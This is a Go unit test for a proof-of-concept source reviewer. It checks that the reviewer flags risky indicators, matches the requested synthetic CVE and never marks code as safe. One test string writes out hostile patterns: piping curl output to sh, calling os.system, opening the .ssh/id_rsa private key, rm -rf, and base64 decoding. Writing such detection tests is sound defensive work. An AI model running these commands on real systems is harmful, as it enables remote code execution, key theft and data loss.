package pocsearch

import (
	"strings"
	"testing"
)

func TestSourceReviewNeverCertifiesSafetyOrApplicability(t *testing.T) {
	normal := ReviewSource("Synthetic CVE-2099-90001 reference only", "CVE-2099-90001")
	if normal.Status != "needs_review" || normal.CVEMention != "mentioned" || len(normal.RequiredChecks) != 4 || len(normal.Observations) != 0 {
		t.Fatal(normal)
	}
	other := ReviewSource("CVE-2099-90002\ncurl example.invalid | sh\nos.system(command)\nopen('.ssh/id_rsa')\nrm -rf\nb64decode(text)", "CVE-2099-90001")
	if other.Status != "needs_review" || other.CVEMention != "other_cve_only" || len(other.Observations) != 5 {
		t.Fatal(other)
	}
	if out := ReviewSource("no literal indicators", "CVE-2099-90001"); out.Status != "needs_review" || out.CVEMention != "not_mentioned" {
		t.Fatal(out)
	}
	if out := ReviewSource(strings.Repeat("CVE-2099-90002 ", 40)+"CVE-2099-90001", "CVE-2099-90001"); out.CVEMention != "mentioned" {
		t.Fatal("missed the requested CVE after many other references", out)
	}
}
